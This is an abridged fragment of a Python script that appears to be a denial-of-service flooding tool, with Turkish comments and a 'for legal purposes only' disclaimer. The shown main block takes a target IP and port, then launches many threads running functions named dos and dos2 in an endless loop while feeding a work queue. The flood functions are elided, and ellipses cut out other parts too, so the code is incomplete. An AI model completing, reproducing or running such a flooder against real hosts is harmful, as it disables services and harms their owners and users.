...
# froxymedya tarafından
# sadece yasal amaçlar için
...
if __name__ == '__main__':
    ...
    try:
        ...
        print("\033[91mPortunuzu veya ıp adresini kontrol ediniz...\033[0m")
        usage()
    while True:
        for i in range(int(thr)):
            t = threading.Thread(target=dos)
            t.daemon = True  # eğer thread varsa, ölür
            t.start()
            t2 = threading.Thread(target=dos2)
            t2.daemon = True  # eğer thread varsa, ölür
            t2.start()
        start = time.time()
        # görev
        item = 0
        while True:
            if (item > 1800):  # bellek çökmesi olmasın diye
                item = 0
                time.sleep(0.1)
            item = item + 1
            q.put(item)
